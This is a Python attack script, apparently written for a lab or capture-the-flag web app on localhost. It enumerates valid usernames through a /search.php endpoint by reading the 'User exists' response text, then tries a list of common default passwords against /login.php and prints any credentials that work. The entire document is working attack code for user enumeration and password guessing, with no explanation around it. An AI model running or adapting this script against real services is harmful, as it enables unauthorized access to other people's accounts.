#!/usr/bin/env python3
"""
Enumerate valid usernames via /search.php
Then try common default passwords for any valid users found
"""
import requests

search_url = "http://127.0.0.1:8080/search.php"
login_url = "http://127.0.0.1:8080/login.php"

# Common usernames to test
usernames = [
    "admin", "root", "administrator", "user", "test",
    "bob", "alice", "john", "jane", "guest",
    "beta", "tester", "developer", "support", "api",
    "manager", "operator", "viewer", "staff", "help",
    "phpabusers", "phpabuser", "phpabusers_admin"
]

valid_users = []

print("=" * 80)
print("USERNAME ENUMERATION via /search.php")
print("=" * 80)

for username in usernames:
    data = {"username": username}
    try:
        response = requests.post(search_url, data=data, timeout=10)
        # Check if user exists
        if "User exists:" in response.text or " exists:" in response.text:
            valid_users.append(username)
            print(f"[FOUND] User: {username}")
        elif "filtered" in response.text.lower():
            print(f"[FILTERED] User: {username}")
    except Exception as e:
        print(f"[ERROR] User: {username}: {e}")

print("\n" + "=" * 80)
print("VALID USERS DISCOVERED:")
print("=" * 80)
for user in valid_users:
    print(f"  - {user}")

# Try common passwords for valid users
common_passwords = [
    "password", "admin", "123456", "qwerty", "password123",
    "admin123", "root", "test", "12345678", "password1",
    "letmein", "welcome", "monkey", "1234567890", "football",
    "iloveyou", "adminadmin", "changeme", "default", "",
    "bob", "phpabusers", "phpabuser", "beta", "beta123",
    "betauser", "betaadmin", "test123", "testtest"
]

print("\n" + "=" * 80)
print("TESTING DEFAULT PASSWORDS FOR VALID USERS")
print("=" * 80)

successful_logins = []

for user in valid_users:
    for password in common_passwords:
        data = {"username": user, "password": password}
        try:
            response = requests.post(login_url, data=data, timeout=10, allow_redirects=True)
            # Check for successful login indicators
            if "Error!" not in response.text and "login" not in response.text.lower():
                successful_logins.append((user, password))
                print(f"[SUCCESS] User: {user}, Pass: {password}")
                print(f"          Response snippet: {response.text[:150]}")
            elif "Error!" in response.text:
                pass  # Expected for wrong passwords
        except Exception as e:
            pass

print("\n" + "=" * 80)
print("RESULTS SUMMARY")
print("=" * 80)
print(f"Total users tested: {len(usernames)}")
print(f"Valid users found: {len(valid_users)}")
print(f"Successful logins: {len(successful_logins)}")

if successful_logins:
    print("\nWorking credentials:")
    for user, password in successful_logins:
        print(f"  Username: {user}, Password: {password}")

